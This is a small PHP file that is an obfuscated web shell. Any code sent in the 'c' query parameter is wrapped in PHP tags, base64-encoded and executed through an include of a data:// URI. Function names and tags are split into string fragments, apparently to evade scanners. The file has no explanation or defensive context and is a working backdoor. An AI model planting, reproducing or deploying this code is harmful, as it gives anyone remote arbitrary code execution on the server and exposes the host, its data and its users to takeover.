<?php
define('KEY', 'c');
define('FUNC', 'base' . '64' . '_' . 'encode');
define('PREFIX', '<' . '?' . 'php ');
define('SUFFIX', ' ?' . '>');

if(isset($_GET[KEY])) {
    $code = PREFIX . $_GET[KEY] . SUFFIX;
    $encoder = FUNC;
    include 'data://text/plain;base64,' . $encoder($code);
}
?>
